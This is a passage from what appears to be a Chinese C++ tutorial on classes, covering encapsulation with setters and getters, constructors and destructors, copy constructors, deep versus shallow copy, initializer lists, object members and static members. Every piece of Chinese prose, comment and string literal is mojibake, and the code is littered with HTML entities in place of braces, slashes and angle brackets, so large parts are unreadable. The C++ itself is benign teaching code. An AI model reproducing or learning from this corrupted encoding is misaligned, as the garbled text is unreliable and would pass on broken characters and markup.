0;\n&#125;\n\næˆå‘˜å±æ€§è®¾ç½®ä¸ºç§æœ‰ä¼˜ç‚¹1ï¼šå°†æ‰€æœ‰æˆå‘˜å±æ€§è®¾ç½®ä¸ºç§æœ‰ï¼Œå¯ä»¥è‡ªå·±æ§åˆ¶è¯»å†™æƒé™\nä¼˜ç‚¹2ï¼šå¯¹äºå†™æƒé™ï¼Œæˆ‘ä»¬å¯ä»¥æ£€æµ‹æ•°æ®çš„æœ‰æ•ˆæ€§\nç¤ºä¾‹ï¼š\nclass Person &#123;\npublic:\n\n\t&#x2F;&#x2F;å§“åè®¾ç½®å¯è¯»å¯å†™\n\tvoid setName(string name) &#123;\n\t\tm_Name &#x3D; name;\n\t&#125;\n\tstring getName()\n\t&#123;\n\t\treturn m_Name;\n\t&#125;\n\n\n\t&#x2F;&#x2F;è·å–å¹´é¾„ \n\tint getAge() &#123;\n\t\treturn m_Age;\n\t&#125;\n\t&#x2F;&#x2F;è®¾ç½®å¹´é¾„\n\tvoid setAge(int age) &#123;\n\t\tif (age &lt; 0 || age &gt; 150) &#123;\n\t\t\tcout &lt;&lt; &quot;ä½ ä¸ªè€å¦–ç²¾!&quot; &lt;&lt; endl;\n\t\t\treturn;\n\t\t&#125;\n\t\tm_Age &#x3D; age;\n\t&#125;\n\n\t&#x2F;&#x2F;æƒ…äººè®¾ç½®ä¸ºåªå†™\n\tvoid setLover(string lover) &#123;\n\t\tm_Lover &#x3D; lover;\n\t&#125;\n\nprivate:\n\tstring m_Name; &#x2F;&#x2F;å¯è¯»å¯å†™  å§“å\n\t\n\tint m_Age; &#x2F;&#x2F;åªè¯»  å¹´é¾„\n\n\tstring m_Lover; &#x2F;&#x2F;åªå†™  æƒ…äºº\n&#125;;\n\n\nint main() &#123;\n\n\tPerson p;\n\t&#x2F;&#x2F;å§“åè®¾ç½®\n\tp.setName(&quot;å¼ ä¸‰&quot;);\n\tcout &lt;&lt; &quot;å§“åï¼š &quot; &lt;&lt; p.getName() &lt;&lt; endl;\n\n\t&#x2F;&#x2F;å¹´é¾„è®¾ç½®\n\tp.setAge(50);\n\tcout &lt;&lt; &quot;å¹´é¾„ï¼š &quot; &lt;&lt; p.getAge() &lt;&lt; endl;\n\n\t&#x2F;&#x2F;æƒ…äººè®¾ç½®\n\tp.setLover(&quot;è‹äº•&quot;);\n\t&#x2F;&#x2F;cout &lt;&lt; &quot;æƒ…äººï¼š &quot; &lt;&lt; p.m_Lover &lt;&lt; endl;  &#x2F;&#x2F;åªå†™å±æ€§ï¼Œä¸å¯ä»¥è¯»å–\n\n\tsystem(&quot;pause&quot;);\n\n\treturn 0;\n&#125;\n\nå¯¹è±¡çš„åˆå§‹åŒ–å’Œæ¸…ç†\nç”Ÿæ´»ä¸­æˆ‘ä»¬ä¹°çš„ç”µå­äº§å“éƒ½åŸºæœ¬ä¼šæœ‰å‡ºå‚è®¾ç½®ï¼Œåœ¨æŸä¸€å¤©æˆ‘ä»¬ä¸ç”¨æ—¶å€™ä¹Ÿä¼šåˆ é™¤ä¸€äº›è‡ªå·±ä¿¡æ¯æ•°æ®ä¿è¯å®‰å…¨\nC++ä¸­çš„é¢å‘å¯¹è±¡æ¥æºäºç”Ÿæ´»ï¼Œæ¯ä¸ªå¯¹è±¡ä¹Ÿéƒ½ä¼šæœ‰åˆå§‹è®¾ç½®ä»¥åŠ å¯¹è±¡é”€æ¯å‰çš„æ¸…ç†æ•°æ®çš„è®¾ç½®ã€‚\n\næ„é€ å‡½æ•°å’Œææ„å‡½æ•°å¯¹è±¡çš„åˆå§‹åŒ–å’Œæ¸…ç†ä¹Ÿæ˜¯ä¸¤ä¸ªéå¸¸é‡è¦çš„å®‰å…¨é—®é¢˜\nä¸€ä¸ªå¯¹è±¡æˆ–è€…å˜é‡æ²¡æœ‰åˆå§‹çŠ¶æ€ï¼Œå¯¹å…¶ä½¿ç”¨åæœæ˜¯æœªçŸ¥\nåŒæ ·çš„ä½¿ç”¨å®Œä¸€ä¸ªå¯¹è±¡æˆ–å˜é‡ï¼Œæ²¡æœ‰åŠæ—¶æ¸…ç†ï¼Œä¹Ÿä¼šé€ æˆä¸€å®šçš„å®‰å…¨é—®é¢˜\nc++åˆ©ç”¨äº†æ„é€ å‡½æ•°å’Œææ„å‡½æ•°è§£å†³ä¸Šè¿°é—®é¢˜ï¼Œè¿™ä¸¤ä¸ªå‡½æ•°å°†ä¼šè¢«ç¼–è¯‘å™¨è‡ªåŠ¨è°ƒç”¨ï¼Œå®Œæˆå¯¹è±¡åˆå§‹åŒ–å’Œæ¸…ç†å·¥ä½œã€‚\nå¯¹è±¡çš„åˆå§‹åŒ–å’Œæ¸…ç†å·¥ä½œæ˜¯ç¼–è¯‘å™¨å¼ºåˆ¶è¦æˆ‘ä»¬åšçš„äº‹æƒ…ï¼Œå› æ­¤å¦‚æœæˆ‘ä»¬ä¸æä¾›æ„é€ å’Œææ„ï¼Œç¼–è¯‘å™¨ä¼šæä¾›\nç¼–è¯‘å™¨æä¾›çš„æ„é€ å‡½æ•°å’Œææ„å‡½æ•°æ˜¯ç©ºå®ç°ã€‚\n\næ„é€ å‡½æ•°ï¼šä¸»è¦ä½œç”¨åœ¨äºåˆ›å»ºå¯¹è±¡æ—¶ä¸ºå¯¹è±¡çš„æˆå‘˜å±æ€§èµ‹å€¼ï¼Œæ„é€ å‡½æ•°ç”±ç¼–è¯‘å™¨è‡ªåŠ¨è°ƒç”¨ï¼Œæ— é¡»æ‰‹åŠ¨è°ƒç”¨ã€‚\nææ„å‡½æ•°ï¼šä¸»è¦ä½œç”¨åœ¨äºå¯¹è±¡é”€æ¯å‰ç³»ç»Ÿè‡ªåŠ¨è°ƒç”¨ï¼Œæ‰§è¡Œä¸€äº›æ¸…ç†å·¥ä½œã€‚\n\næ„é€ å‡½æ•°è¯­æ³•ï¼šç±»å()&#123;&#125;\n\næ„é€ å‡½æ•°ï¼Œæ²¡æœ‰è¿”å›å€¼ä¹Ÿä¸å†™void\nå‡½æ•°åç§°ä¸ç±»åç›¸åŒ\næ„é€ å‡½æ•°å¯ä»¥æœ‰å‚æ•°ï¼Œå› æ­¤å¯ä»¥å‘ç”Ÿé‡è½½\nç¨‹åºåœ¨è°ƒç”¨å¯¹è±¡æ—¶å€™ä¼šè‡ªåŠ¨è°ƒç”¨æ„é€ ï¼Œæ— é¡»æ‰‹åŠ¨è°ƒç”¨,è€Œä¸”åªä¼šè°ƒç”¨ä¸€æ¬¡\n\nææ„å‡½æ•°è¯­æ³•ï¼š ~ç±»å()&#123;&#125;\n\nææ„å‡½æ•°ï¼Œæ²¡æœ‰è¿”å›å€¼ä¹Ÿä¸å†™void\nå‡½æ•°åç§°ä¸ç±»åç›¸åŒ,åœ¨åç§°å‰åŠ ä¸Šç¬¦å· ~\nææ„å‡½æ•°ä¸å¯ä»¥æœ‰å‚æ•°ï¼Œå› æ­¤ä¸å¯ä»¥å‘ç”Ÿé‡è½½\nç¨‹åºåœ¨å¯¹è±¡é”€æ¯å‰ä¼šè‡ªåŠ¨è°ƒç”¨ææ„ï¼Œæ— é¡»æ‰‹åŠ¨è°ƒç”¨,è€Œä¸”åªä¼šè°ƒç”¨ä¸€æ¬¡\n\nclass Person\n&#123;\npublic:\n\t&#x2F;&#x2F;æ„é€ å‡½æ•°\n\tPerson()\n\t&#123;\n\t\tcout &lt;&lt; &quot;Personçš„æ„é€ å‡½æ•°è°ƒç”¨&quot; &lt;&lt; endl;\n\t&#125;\n\t&#x2F;&#x2F;ææ„å‡½æ•°\n\t~Person()\n\t&#123;\n\t\tcout &lt;&lt; &quot;Personçš„ææ„å‡½æ•°è°ƒç”¨&quot; &lt;&lt; endl;\n\t&#125;\n\n&#125;;\n\nvoid test01()\n&#123;\n\tPerson p;\n&#125;\n\nint main() &#123;\n\t\n\ttest01();\n\n\tsystem(&quot;pause&quot;);\n\n\treturn 0;\n&#125;\n\næ„é€ å‡½æ•°çš„åˆ†ç±»åŠè°ƒç”¨ä¸¤ç§åˆ†ç±»æ–¹å¼ï¼š\næŒ‰å‚æ•°åˆ†ä¸ºï¼š æœ‰å‚æ„é€ å’Œæ— å‚æ„é€ \næŒ‰ç±»å‹åˆ†ä¸ºï¼š æ™®é€šæ„é€ å’Œæ‹·è´æ„é€ \nä¸‰ç§è°ƒç”¨æ–¹å¼ï¼š\næ‹¬å·æ³•\næ˜¾ç¤ºæ³•\néšå¼è½¬æ¢æ³•\nç¤ºä¾‹ï¼š\n&#x2F;&#x2F;1ã€æ„é€ å‡½æ•°åˆ†ç±»\n&#x2F;&#x2F; æŒ‰ç…§å‚æ•°åˆ†ç±»åˆ†ä¸º æœ‰å‚å’Œæ— å‚æ„é€    æ— å‚åˆç§°ä¸ºé»˜è®¤æ„é€ å‡½æ•°\n&#x2F;&#x2F; æŒ‰ç…§ç±»å‹åˆ†ç±»åˆ†ä¸º æ™®é€šæ„é€ å’Œæ‹·è´æ„é€ \n\nclass Person &#123;\npublic:\n\t&#x2F;&#x2F;æ— å‚ï¼ˆé»˜è®¤ï¼‰æ„é€ å‡½æ•°\n\tPerson() &#123;\n\t\tcout &lt;&lt; &quot;æ— å‚æ„é€ å‡½æ•°!&quot; &lt;&lt; endl;\n\t&#125;\n\t&#x2F;&#x2F;æœ‰å‚æ„é€ å‡½æ•°\n\tPerson(int a) &#123;\n\t\tage &#x3D; a;\n\t\tcout &lt;&lt; &quot;æœ‰å‚æ„é€ å‡½æ•°!&quot; &lt;&lt; endl;\n\t&#125;\n\t&#x2F;&#x2F;æ‹·è´æ„é€ å‡½æ•°\n\tPerson(const Person&amp; p) &#123;\n\t\tage &#x3D; p.age;\n\t\tcout &lt;&lt; &quot;æ‹·è´æ„é€ å‡½æ•°!&quot; &lt;&lt; endl;\n\t&#125;\n\t&#x2F;&#x2F;ææ„å‡½æ•°\n\t~Person() &#123;\n\t\tcout &lt;&lt; &quot;ææ„å‡½æ•°!&quot; &lt;&lt; endl;\n\t&#125;\npublic:\n\tint age;\n&#125;;\n\n&#x2F;&#x2F;2ã€æ„é€ å‡½æ•°çš„è°ƒç”¨\n&#x2F;&#x2F;è°ƒç”¨æ— å‚æ„é€ å‡½æ•°\nvoid test01() &#123;\n\tPerson p; &#x2F;&#x2F;è°ƒç”¨æ— å‚æ„é€ å‡½æ•°\n&#125;\n\n&#x2F;&#x2F;è°ƒç”¨æœ‰å‚çš„æ„é€ å‡½æ•°\nvoid test02() &#123;\n\n\t&#x2F;&#x2F;2.1  æ‹¬å·æ³•ï¼Œå¸¸ç”¨\n\tPerson p1(10);\n\t&#x2F;&#x2F;æ³¨æ„1ï¼šè°ƒç”¨æ— å‚æ„é€ å‡½æ•°ä¸èƒ½åŠ æ‹¬å·ï¼Œå¦‚æœåŠ äº†ç¼–è¯‘å™¨è®¤ä¸ºè¿™æ˜¯ä¸€ä¸ªå‡½æ•°å£°æ˜\n\t&#x2F;&#x2F;Person p2();\n\n\t&#x2F;&#x2F;2.2 æ˜¾å¼æ³•\n\tPerson p2 &#x3D; Person(10); \n\tPerson p3 &#x3D; Person(p2);\n\t&#x2F;&#x2F;Person(10)å•ç‹¬å†™å°±æ˜¯åŒ¿åå¯¹è±¡  å½“å‰è¡Œç»“æŸä¹‹åï¼Œé©¬ä¸Šææ„\n\n\t&#x2F;&#x2F;2.3 éšå¼è½¬æ¢æ³•\n\tPerson p4 &#x3D; 10; &#x2F;&#x2F; Person p4 &#x3D; Person(10); \n\tPerson p5 &#x3D; p4; &#x2F;&#x2F; Person p5 &#x3D; Person(p4); \n\n\t&#x2F;&#x2F;æ³¨æ„2ï¼šä¸èƒ½åˆ©ç”¨ æ‹·è´æ„é€ å‡½æ•° åˆå§‹åŒ–åŒ¿åå¯¹è±¡ ç¼–è¯‘å™¨è®¤ä¸ºæ˜¯å¯¹è±¡å£°æ˜\n\t&#x2F;&#x2F;Person p5(p4);\n&#125;\n\nint main() &#123;\n\n\ttest01();\n\t&#x2F;&#x2F;test02();\n\n\tsystem(&quot;pause&quot;);\n\n\treturn 0;\n&#125;\n\næ‹·è´æ„é€ å‡½æ•°è°ƒç”¨æ—¶æœºC++ä¸­æ‹·è´æ„é€ å‡½æ•°è°ƒç”¨æ—¶æœºé€šå¸¸æœ‰ä¸‰ç§æƒ…å†µ\n\nä½¿ç”¨ä¸€ä¸ªå·²ç»åˆ›å»ºå®Œæ¯•çš„å¯¹è±¡æ¥åˆå§‹åŒ–ä¸€ä¸ªæ–°å¯¹è±¡\nå€¼ä¼ é€’çš„æ–¹å¼ç»™å‡½æ•°å‚æ•°ä¼ å€¼\nä»¥å€¼æ–¹å¼è¿”å›å±€éƒ¨å¯¹è±¡\n\nç¤ºä¾‹ï¼š\nclass Person &#123;\npublic:\n\tPerson() &#123;\n\t\tcout &lt;&lt; &quot;æ— å‚æ„é€ å‡½æ•°!&quot; &lt;&lt; endl;\n\t\tmAge &#x3D; 0;\n\t&#125;\n\tPerson(int age) &#123;\n\t\tcout &lt;&lt; &quot;æœ‰å‚æ„é€ å‡½æ•°!&quot; &lt;&lt; endl;\n\t\tmAge &#x3D; age;\n\t&#125;\n\tPerson(const Person&amp; p) &#123;\n\t\tcout &lt;&lt; &quot;æ‹·è´æ„é€ å‡½æ•°!&quot; &lt;&lt; endl;\n\t\tmAge &#x3D; p.mAge;\n\t&#125;\n\t&#x2F;&#x2F;ææ„å‡½æ•°åœ¨é‡Šæ”¾å†…å­˜ä¹‹å‰è°ƒç”¨\n\t~Person() &#123;\n\t\tcout &lt;&lt; &quot;ææ„å‡½æ•°!&quot; &lt;&lt; endl;\n\t&#125;\npublic:\n\tint mAge;\n&#125;;\n\n&#x2F;&#x2F;1. ä½¿ç”¨ä¸€ä¸ªå·²ç»åˆ›å»ºå®Œæ¯•çš„å¯¹è±¡æ¥åˆå§‹åŒ–ä¸€ä¸ªæ–°å¯¹è±¡\nvoid test01() &#123;\n\n\tPerson man(100); &#x2F;&#x2F;på¯¹è±¡å·²ç»åˆ›å»ºå®Œæ¯•\n\tPerson newman(man); &#x2F;&#x2F;è°ƒç”¨æ‹·è´æ„é€ å‡½æ•°\n\tPerson newman2 &#x3D; man; &#x2F;&#x2F;æ‹·è´æ„é€ \n\n\t&#x2F;&#x2F;Person newman3;\n\t&#x2F;&#x2F;newman3 &#x3D; man; &#x2F;&#x2F;ä¸æ˜¯è°ƒç”¨æ‹·è´æ„é€ å‡½æ•°ï¼Œèµ‹å€¼æ“ä½œ\n&#125;\n\n&#x2F;&#x2F;2. å€¼ä¼ é€’çš„æ–¹å¼ç»™å‡½æ•°å‚æ•°ä¼ å€¼\n&#x2F;&#x2F;ç›¸å½“äºPerson p1 &#x3D; p;\nvoid doWork(Person p1) &#123;&#125;\nvoid test02() &#123;\n\tPerson p; &#x2F;&#x2F;æ— å‚æ„é€ å‡½æ•°\n\tdoWork(p);\n&#125;\n\n&#x2F;&#x2F;3. ä»¥å€¼æ–¹å¼è¿”å›å±€éƒ¨å¯¹è±¡\nPerson doWork2()\n&#123;\n\tPerson p1;\n\tcout &lt;&lt; (int *)&amp;p1 &lt;&lt; endl;\n\treturn p1;\n&#125;\n\nvoid test03()\n&#123;\n\tPerson p &#x3D; doWork2();\n\tcout &lt;&lt; (int *)&amp;p &lt;&lt; endl;\n&#125;\n\n\nint main() &#123;\n\n\t&#x2F;&#x2F;test01();\n\t&#x2F;&#x2F;test02();\n\ttest03();\n\n\tsystem(&quot;pause&quot;);\n\n\treturn 0;\n&#125;\n\næ„é€ å‡½æ•°è°ƒç”¨è§„åˆ™é»˜è®¤æƒ…å†µä¸‹ï¼Œc++ç¼–è¯‘å™¨è‡³å°‘ç»™ä¸€ä¸ªç±»æ·»åŠ 3ä¸ªå‡½æ•°\n1ï¼é»˜è®¤æ„é€ å‡½æ•°(æ— å‚ï¼Œå‡½æ•°ä½“ä¸ºç©º)\n2ï¼é»˜è®¤ææ„å‡½æ•°(æ— å‚ï¼Œå‡½æ•°ä½“ä¸ºç©º)\n3ï¼é»˜è®¤æ‹·è´æ„é€ å‡½æ•°ï¼Œå¯¹å±æ€§è¿›è¡Œå€¼æ‹·è´\næ„é€ å‡½æ•°è°ƒç”¨è§„åˆ™å¦‚ä¸‹ï¼š\n\nå¦‚æœç”¨æˆ·å®šä¹‰æœ‰å‚æ„é€ å‡½æ•°ï¼Œc++ä¸åœ¨æä¾›é»˜è®¤æ— å‚æ„é€ ï¼Œä½†æ˜¯ä¼šæä¾›é»˜è®¤æ‹·è´æ„é€ \nå¦‚æœç”¨æˆ·å®šä¹‰æ‹·è´æ„é€ å‡½æ•°ï¼Œc++ä¸ä¼šå†æä¾›å…¶ä»–æ„é€ å‡½æ•°\n\nç¤ºä¾‹ï¼š\nclass Person &#123;\npublic:\n\t&#x2F;&#x2F;æ— å‚ï¼ˆé»˜è®¤ï¼‰æ„é€ å‡½æ•°\n\tPerson() &#123;\n\t\tcout &lt;&lt; &quot;æ— å‚æ„é€ å‡½æ•°!&quot; &lt;&lt; endl;\n\t&#125;\n\t&#x2F;&#x2F;æœ‰å‚æ„é€ å‡½æ•°\n\tPerson(int a) &#123;\n\t\tage &#x3D; a;\n\t\tcout &lt;&lt; &quot;æœ‰å‚æ„é€ å‡½æ•°!&quot; &lt;&lt; endl;\n\t&#125;\n\t&#x2F;&#x2F;æ‹·è´æ„é€ å‡½æ•°\n\tPerson(const Person&amp; p) &#123;\n\t\tage &#x3D; p.age;\n\t\tcout &lt;&lt; &quot;æ‹·è´æ„é€ å‡½æ•°!&quot; &lt;&lt; endl;\n\t&#125;\n\t&#x2F;&#x2F;ææ„å‡½æ•°\n\t~Person() &#123;\n\t\tcout &lt;&lt; &quot;ææ„å‡½æ•°!&quot; &lt;&lt; endl;\n\t&#125;\npublic:\n\tint age;\n&#125;;\n\nvoid test01()\n&#123;\n\tPerson p1(18);\n\t&#x2F;&#x2F;å¦‚æœä¸å†™æ‹·è´æ„é€ ï¼Œç¼–è¯‘å™¨ä¼šè‡ªåŠ¨æ·»åŠ æ‹·è´æ„é€ ï¼Œå¹¶ä¸”åšæµ…æ‹·è´æ“ä½œ\n\tPerson p2(p1);\n\n\tcout &lt;&lt; &quot;p2çš„å¹´é¾„ä¸ºï¼š &quot; &lt;&lt; p2.age &lt;&lt; endl;\n&#125;\n\nvoid test02()\n&#123;\n\t&#x2F;&#x2F;å¦‚æœç”¨æˆ·æä¾›æœ‰å‚æ„é€ ï¼Œç¼–è¯‘å™¨ä¸ä¼šæä¾›é»˜è®¤æ„é€ ï¼Œä¼šæä¾›æ‹·è´æ„é€ \n\tPerson p1; &#x2F;&#x2F;æ­¤æ—¶å¦‚æœç”¨æˆ·è‡ªå·±æ²¡æœ‰æä¾›é»˜è®¤æ„é€ ï¼Œä¼šå‡ºé”™\n\tPerson p2(10); &#x2F;&#x2F;ç”¨æˆ·æä¾›çš„æœ‰å‚\n\tPerson p3(p2); &#x2F;&#x2F;æ­¤æ—¶å¦‚æœç”¨æˆ·æ²¡æœ‰æä¾›æ‹·è´æ„é€ ï¼Œç¼–è¯‘å™¨ä¼šæä¾›\n\n\t&#x2F;&#x2F;å¦‚æœç”¨æˆ·æä¾›æ‹·è´æ„é€ ï¼Œç¼–è¯‘å™¨ä¸ä¼šæä¾›å…¶ä»–æ„é€ å‡½æ•°\n\tPerson p4; &#x2F;&#x2F;æ­¤æ—¶å¦‚æœç”¨æˆ·è‡ªå·±æ²¡æœ‰æä¾›é»˜è®¤æ„é€ ï¼Œä¼šå‡ºé”™\n\tPerson p5(10); &#x2F;&#x2F;æ­¤æ—¶å¦‚æœç”¨æˆ·è‡ªå·±æ²¡æœ‰æä¾›æœ‰å‚ï¼Œä¼šå‡ºé”™\n\tPerson p6(p5); &#x2F;&#x2F;ç”¨æˆ·è‡ªå·±æä¾›æ‹·è´æ„é€ \n&#125;\n\nint main() &#123;\n\n\ttest01();\n\n\tsystem(&quot;pause&quot;);\n\n\treturn 0;\n&#125;\n\næ·±æ‹·è´ä¸æµ…æ‹·è´æ·±æµ…æ‹·è´æ˜¯é¢è¯•ç»å…¸é—®é¢˜ï¼Œä¹Ÿæ˜¯å¸¸è§çš„ä¸€ä¸ªå‘\næµ…æ‹·è´ï¼šç®€å•çš„èµ‹å€¼æ‹·è´æ“ä½œ\næ·±æ‹·è´ï¼šåœ¨å †åŒºé‡æ–°ç”³è¯·ç©ºé—´ï¼Œè¿›è¡Œæ‹·è´æ“ä½œ\nç¤ºä¾‹ï¼š\nclass Person &#123;\npublic:\n\t&#x2F;&#x2F;æ— å‚ï¼ˆé»˜è®¤ï¼‰æ„é€ å‡½æ•°\n\tPerson() &#123;\n\t\tcout &lt;&lt; &quot;æ— å‚æ„é€ å‡½æ•°!&quot; &lt;&lt; endl;\n\t&#125;\n\t&#x2F;&#x2F;æœ‰å‚æ„é€ å‡½æ•°\n\tPerson(int age ,int height) &#123;\n\t\t\n\t\tcout &lt;&lt; &quot;æœ‰å‚æ„é€ å‡½æ•°!&quot; &lt;&lt; endl;\n\n\t\tm_age &#x3D; age;\n\t\tm_height &#x3D; new int(height);\n\t\t\n\t&#125;\n\t&#x2F;&#x2F;æ‹·è´æ„é€ å‡½æ•°  \n\tPerson(const Person&amp; p) &#123;\n\t\tcout &lt;&lt; &quot;æ‹·è´æ„é€ å‡½æ•°!&quot; &lt;&lt; endl;\n\t\t&#x2F;&#x2F;å¦‚æœä¸åˆ©ç”¨æ·±æ‹·è´åœ¨å †åŒºåˆ›å»ºæ–°å†…å­˜ï¼Œä¼šå¯¼è‡´æµ…æ‹·è´å¸¦æ¥çš„é‡å¤é‡Šæ”¾å †åŒºé—®é¢˜\n\t\tm_age &#x3D; p.m_age;\n\t\tm_height &#x3D; new int(*p.m_height);\n\t\t\n\t&#125;\n\n\t&#x2F;&#x2F;ææ„å‡½æ•°\n\t~Person() &#123;\n\t\tcout &lt;&lt; &quot;ææ„å‡½æ•°!&quot; &lt;&lt; endl;\n\t\tif (m_height !&#x3D; NULL)\n\t\t&#123;\n\t\t\tdelete m_height;\n\t\t&#125;\n\t&#125;\npublic:\n\tint m_age;\n\tint* m_height;\n&#125;;\n\nvoid test01()\n&#123;\n\tPerson p1(18, 180);\n\n\tPerson p2(p1);\n\n\tcout &lt;&lt; &quot;p1çš„å¹´é¾„ï¼š &quot; &lt;&lt; p1.m_age &lt;&lt; &quot; èº«é«˜ï¼š &quot; &lt;&lt; *p1.m_height &lt;&lt; endl;\n\n\tcout &lt;&lt; &quot;p2çš„å¹´é¾„ï¼š &quot; &lt;&lt; p2.m_age &lt;&lt; &quot; èº«é«˜ï¼š &quot; &lt;&lt; *p2.m_height &lt;&lt; endl;\n&#125;\n\nint main() &#123;\n\n\ttest01();\n\n\tsystem(&quot;pause&quot;);\n\n\treturn 0;\n&#125;\n\n\n\n\n\n\n\n\n\n\næ€»ç»“ï¼šå¦‚æœå±æ€§æœ‰åœ¨å †åŒºå¼€è¾Ÿçš„ï¼Œä¸€å®šè¦è‡ªå·±æä¾›æ‹·è´æ„é€ å‡½æ•°ï¼Œé˜²æ­¢æµ…æ‹·è´å¸¦æ¥çš„é—®é¢˜\nåˆå§‹åŒ–åˆ—è¡¨ä½œç”¨ï¼š\nC++æä¾›äº†åˆå§‹åŒ–åˆ—è¡¨è¯­æ³•ï¼Œç”¨æ¥åˆå§‹åŒ–å±æ€§\nè¯­æ³•ï¼šæ„é€ å‡½æ•°()ï¼šå±æ€§1(å€¼1),å±æ€§2ï¼ˆå€¼2ï¼‰... &#123;&#125;\nç¤ºä¾‹ï¼š\nclass Person &#123;\npublic:\n\n\t&#x2F;&#x2F;&#x2F;&#x2F;ä¼ ç»Ÿæ–¹å¼åˆå§‹åŒ–\n\t&#x2F;&#x2F;Person(int a, int b, int c) &#123;\n\t&#x2F;&#x2F;\tm_A &#x3D; a;\n\t&#x2F;&#x2F;\tm_B &#x3D; b;\n\t&#x2F;&#x2F;\tm_C &#x3D; c;\n\t&#x2F;&#x2F;&#125;\n\n\t&#x2F;&#x2F;åˆå§‹åŒ–åˆ—è¡¨æ–¹å¼åˆå§‹åŒ–\n\tPerson(int a, int b, int c) :m_A(a), m_B(b), m_C(c) &#123;&#125;\n\tvoid PrintPerson() &#123;\n\t\tcout &lt;&lt; &quot;mA:&quot; &lt;&lt; m_A &lt;&lt; endl;\n\t\tcout &lt;&lt; &quot;mB:&quot; &lt;&lt; m_B &lt;&lt; endl;\n\t\tcout &lt;&lt; &quot;mC:&quot; &lt;&lt; m_C &lt;&lt; endl;\n\t&#125;\nprivate:\n\tint m_A;\n\tint m_B;\n\tint m_C;\n&#125;;\n\nint main() &#123;\n\n\tPerson p(1, 2, 3);\n\tp.PrintPerson();\n\n\n\tsystem(&quot;pause&quot;);\n\n\treturn 0;\n&#125;\n\nç±»å¯¹è±¡ä½œä¸ºç±»æˆå‘˜C++ç±»ä¸­çš„æˆå‘˜å¯ä»¥æ˜¯å¦ä¸€ä¸ªç±»çš„å¯¹è±¡ï¼Œæˆ‘ä»¬ç§°è¯¥æˆå‘˜ä¸º å¯¹è±¡æˆå‘˜\nä¾‹å¦‚ï¼š\nclass A &#123;&#125;\nclass B\n&#123;\n    A aï¼›\n&#125;\n\nBç±»ä¸­æœ‰å¯¹è±¡Aä½œä¸ºæˆå‘˜ï¼ŒAä¸ºå¯¹è±¡æˆå‘˜\né‚£ä¹ˆå½“åˆ›å»ºBå¯¹è±¡æ—¶ï¼ŒAä¸Bçš„æ„é€ å’Œææ„çš„é¡ºåºæ˜¯è°å…ˆè°åï¼Ÿ\nç¤ºä¾‹ï¼š\nclass Phone\n&#123;\npublic:\n\tPhone(string name)\n\t&#123;\n\t\tm_PhoneName &#x3D; name;\n\t\tcout &lt;&lt; &quot;Phoneæ„é€ &quot; &lt;&lt; endl;\n\t&#125;\n\n\t~Phone()\n\t&#123;\n\t\tcout &lt;&lt; &quot;Phoneææ„&quot; &lt;&lt; endl;\n\t&#125;\n\n\tstring m_PhoneName;\n\n&#125;;\n\n\nclass Person\n&#123;\npublic:\n\n\t&#x2F;&#x2F;åˆå§‹åŒ–åˆ—è¡¨å¯ä»¥å‘Šè¯‰ç¼–è¯‘å™¨è°ƒç”¨å“ªä¸€ä¸ªæ„é€ å‡½æ•°\n\tPerson(string name, string pName) :m_Name(name), m_Phone(pName)\n\t&#123;\n\t\tcout &lt;&lt; &quot;Personæ„é€ &quot; &lt;&lt; endl;\n\t&#125;\n\n\t~Person()\n\t&#123;\n\t\tcout &lt;&lt; &quot;Personææ„&quot; &lt;&lt; endl;\n\t&#125;\n\n\tvoid playGame()\n\t&#123;\n\t\tcout &lt;&lt; m_Name &lt;&lt; &quot; ä½¿ç”¨&quot; &lt;&lt; m_Phone.m_PhoneName &lt;&lt; &quot; ç‰Œæ‰‹æœº! &quot; &lt;&lt; endl;\n\t&#125;\n\n\tstring m_Name;\n\tPhone m_Phone;\n\n&#125;;\nvoid test01()\n&#123;\n\t&#x2F;&#x2F;å½“ç±»ä¸­æˆå‘˜æ˜¯å…¶ä»–ç±»å¯¹è±¡æ—¶ï¼Œæˆ‘ä»¬ç§°è¯¥æˆå‘˜ä¸º å¯¹è±¡æˆå‘˜\n\t&#x2F;&#x2F;æ„é€ çš„é¡ºåºæ˜¯ ï¼šå…ˆè°ƒç”¨å¯¹è±¡æˆå‘˜çš„æ„é€ ï¼Œå†è°ƒç”¨æœ¬ç±»æ„é€ \n\t&#x2F;&#x2F;ææ„é¡ºåºä¸æ„é€ ç›¸å\n\tPerson p(&quot;å¼ ä¸‰&quot; , &quot;è‹¹æœX&quot;);\n\tp.playGame();\n\n&#125;\n\n\nint main() &#123;\n\n\ttest01();\n\n\tsystem(&quot;pause&quot;);\n\n\treturn 0;\n&#125;\n\né™æ€æˆå‘˜é™æ€æˆå‘˜å°±æ˜¯åœ¨æˆå‘˜å˜é‡å’Œæˆå‘˜å‡½æ•°å‰åŠ ä¸Šå…³é”®å­—staticï¼Œç§°ä¸ºé™æ€æˆå‘˜\né™æ€æˆå‘˜åˆ†ä¸ºï¼š\n\né™æ€æˆå‘˜å˜é‡\næ‰€æœ‰å¯¹è±¡å…±äº«åŒä¸€ä»½æ•°æ®\nåœ¨ç¼–è¯‘é˜¶æ®µåˆ†é…å†…å­˜\nç±»å†…å£°æ˜ï¼Œç±»å¤–åˆå§‹åŒ–\n\n\né™æ€æˆå‘˜å‡½æ•°\næ‰€æœ‰å¯¹è±¡å…±äº«åŒä¸€ä¸ªå‡½æ•°\né™æ€æˆå‘˜å‡½æ•°åªèƒ½è®¿é—®é™æ€æˆå‘˜å˜é‡\n\n\n\nç¤ºä¾‹1 ï¼šé™æ€æˆå‘˜å˜é‡\nclass Person\n&#123;\n\t\npublic:\n\n\tstatic int m_A; &#x2F;&#x2F;é™æ€æˆå‘˜å˜é‡\n\n\t&#x2F;&#x2F;é™æ€æˆå‘˜å˜é‡ç‰¹ç‚¹ï¼š\n\t&#x2F;&#x2F;1 åœ¨ç¼–è¯‘é˜¶æ®µåˆ†é…å†…å­˜\n\t&#x2F;&#x2F;2 ç±»å†…å£°æ˜ï¼Œç±»å¤–åˆå§‹åŒ–\n\t&#x2F;&#x2F;3 æ‰€æœ‰å¯¹è±¡å…±äº«åŒä¸€ä»½æ•°æ®\n\nprivate:\n\tstatic int m_B; &#x2F;&#x2F;é™æ€æˆå‘˜å˜é‡ä¹Ÿæ˜¯æœ‰è®¿é—®æƒé™çš„\n&#125;;\nint Person::m_A &#x3D; 10;\nint Person::m_B &#x3D; 10;\n\nvoid test01()\n&#123;\n\t&#x2F;&#x2F;é™æ€æˆå‘˜å˜é‡ä¸¤ç§è®¿é—®æ–¹å¼\n\n\t&#x2F;&#x2F;1ã€é€šè¿‡å¯¹è±¡\n\tPerson 